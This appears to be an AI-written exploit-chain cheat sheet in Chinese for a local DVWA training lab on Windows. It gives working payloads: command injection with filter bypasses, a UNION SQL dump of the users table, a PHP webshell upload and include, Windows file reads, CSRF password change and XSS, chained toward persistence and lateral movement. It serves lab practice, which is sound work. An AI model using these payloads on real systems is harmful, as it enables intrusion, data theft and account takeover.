DVWA 利用链（授权本地靶场 · Windows 环境定制）

  • 目标：http://localhost/dvwa/（Apache/2.4.39 Win64 + PHP/7.3.4 + MySQL 库 dvwa）
  • 授权：仅用于本机 DVWA，严禁用于未授权系统。
  • 验证状态（诚实声明）：下方 payload 基于 DVWA 标准源码的真实行为 + 你文档确认的 Windows 环境定制；AI（我）未做实机执行（沙箱无法连你的 localhost）。请在本机靶场运行 dvwa_exploit.py 并回填结果，完成「AI输出→人工验证→差异分析」闭环。
  • 配套脚本：dvwa_exploit.py（一键：登录→降级 low→exec/sqli/upload/fi/csrf/xss_r）。

0. 前版文档的 Windows 环境错误修正（对照”AI摸鱼”痛点）

模块 前文档 payload（Linux / 错误） 正确（Windows WAMP） 原因
exec 127.0.0.1;id 127.0.0.1&whoami Windows cmd.exe 不认 ;（分号）和反引号，且没有 id 命令
exec 127.0.0.1`id` `127.0.0.1 whoami`
exec 依赖 ping -c 4 成功后才接命令 用 &/| 分隔 DVWA 源码写死 ping -c 4，Windows 上该参数非法会直接失败，&& 因此不会执行后续；&/| 不受前命令成败影响
fi ../../../../../../etc/passwd C:/Windows/System32/drivers/etc/hosts（或 C:/Windows/win.ini） Windows 无 /etc 目录
upload 访问 ?c=id 访问 ?c=whoami Windows 无 id
全站 /etc/passwd、id、cat 等 whoami/ver/ipconfig、C:\Windows\... 靶机是 Windows，不是 Linux

结论：前版”攻击面分析与测试用例”多数 payload 是从公开经验/训练数据直接搬来的 Linux 写法，未在 Windows DVWA 上实测，这正是你批的”摸鱼”。本文件已全部改为 Windows 可执行形态。

1. 主利用链（跨模块联动）

链路 1：降级 → 三选一拿 RCE

set_sec(low) 后，exec / upload / fi 全部进入最易形态：

  • exec：ip=127.0.0.1&whoami（Windows & 分隔，绕过 ping -c 4 失败）
  • upload：传 shell.php → GET /dvwa/hackable/uploads/shell.php?c=whoami（最持久）
  • fi：page=C:/Windows/System32/drivers/etc/hosts 读文件；page=../../hackable/uploads/shell.php&c=whoami 直接 include WebShell 实现 RCE

链路 2：sqli 拖库 → 横向

-1' UNION SELECT user, password FROM users -- - 拖出 user:md5(password)。
把明文弱口令/哈希喂回 TC-BRUTE/login.php 做其他账户横向。

链路 3：RCE → 权限维持

拿到 WebShell 或命令执行后：

  • csrf：生成 csrf_poc.html，诱导已登录 admin 的浏览器打开 → 改掉 admin 口令，锁死控制权。
  • weak_id：记录 dvwaSession Cookie，分析是否顺序/时间戳可预测 → 预测后直接复用他人会话免登录。

2. 模块利用速查（Windows 正确 payload）

模块 级别 关键 payload 判定
exec low ip=127.0.0.1&whoami（POST） 回显含 desktop-xxx\user
exec medium ip=127.0.0.1|whoami（绕过 str_replace('&&'/';;')） 执行
exec high ip=127.0.0.1%0awhoami（换行分隔绕过 &;|-$ 过滤） 执行
sqli low id=1' OR '1'='1 / -1' UNION SELECT user,password FROM users -- - 全表 / 拖库
sqli_blind low id=1' AND SLEEP(5)-- 延迟 ≥5s
upload low 传 <?php system($_GET['c']);?> 访问 ?c=whoami 执行
fi low page=C:/Windows/System32/drivers/etc/hosts 含 localhost
csrf low/medium 自动提交表单改 password_new 口令被改
xss_r low name=<script>alert(1)</script> 执行
xss_s low mtxMessage=<script>alert(1)</script> 存储触发
xss_d 全级 default=<script>alert(1)</script>（纯客户端） 执行
